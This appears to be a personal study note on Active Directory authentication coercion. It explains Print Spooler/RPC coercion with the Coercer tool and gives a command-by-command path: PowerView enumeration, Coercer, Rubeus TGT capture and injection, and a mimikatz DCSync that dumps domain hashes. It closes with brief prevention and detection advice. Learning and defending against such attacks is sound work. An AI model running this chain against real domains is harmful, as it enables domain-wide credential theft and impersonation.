### General Notes

This is an [[Active Directory]] attack where an attacker trickers a Windows host into authenticating to a device controlled by an attacker.
- The attacker sends a request to a windows service that causes the target system to initiate an authentication connection.
- The attacker controls where this authentication request goes, either to themselves or to a *relayed* machine.

> This is done on *RPC* functions like the [[Print Spooler]] bug. The [Coercer](https://github.com/p0dalirius/Coercer) tool is developed to exploit vulnerable RPC functions.

###### Impact on [[Domain Controller]]s
If any Domain Controller has *print spooler* service enabled - knowing it is the most powerful machine in the [[Active Directory]] domain - an attacker can force the DC to authenticate elsewhere. 

The following attacks are possible:
1. The attacker can authenticate to another DC, and perform a [[DCSync]] attack to extract all the password hashes of the Active Directory. This is the case if [[Server Message Block (SMB)]] signing is off.
2. Relay the authentication to *Active Directory Certificate Services* to obtain a [[Certificates|Certificate]] for the [[Domain Controller]] that can be used by attackers to pretend to be the Domain Controller.
3. The attacker can relay the connection to a machine with [[Kerberos Constrained Delegation Attack#Delegation|Unconstrained Delegation]] enabled, which causes that machine to obtain the DC's *TGT*. The attacker can them dump the *TGT* of the DC from that machine and impersonate the DC.

---
### Attack Path for Unconstrained Delegation

The goal here is to force a DC to connect to a machine with *Unconstrained Delegation* which the attacker can then obtain from the target machine.

The first step is to identify systems that are configured for *Unconstrained Delegation*, which can be done using `Get-NetComputer` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) with the `-Unconstrained` switch.
```powershell
Get-NetComputer -Unconstrained | select samaccountname
```
- The `samaccountname` is the user logon name and it is unique per domain.

Once we identify the machine of choice, we need to run the `coercer` tool to target the Domain Controller and force it to connect to the machine identified.
```powershell
Coercer -u <domain-user> -p <password> -d <domain> -l <UD-machine> -t <DC>
```
- The machine identified we should have obtained a username and password for it.

Once that is done, we need to obtain the *TGT* of the *DC* from the identified machine. If we have access to the machine, we can run `Rubeus` to monitor for logons and extract *TGTs*. This should be run in an administrator shell.
```powershell
Rubeus.exe monitor /interval:1
```

Once we obtain the TGT for the DC, we can use it to act as the DC, so we can execute the [[DCSync]] attack.
1. We insert the DC ticket into the current session:
```powershell
Rubeus.exe ptt /ticket:<TICKET>
```
2. Use `mimikatz` to execute the DCSync attack:
```powershell
mimkatz.exe
lsadump::dcsync /domain:<domain> /user:Administrator
```

---
### Prevention & Detection

Implementing a *third party RPC* [[Firewall]] to block dangerous RPC function, and blocking connections to outbound [[Port]]s like `139` and `445`.

To detect this type of attack from `Corecer`, we can check the network traffic logs to see:
- We will see connections going to the DC, followed by connections from the DC to the attacker machine (machine with *UD*).
- This can be done several times while `Coercer` tries different RPC functions.

---
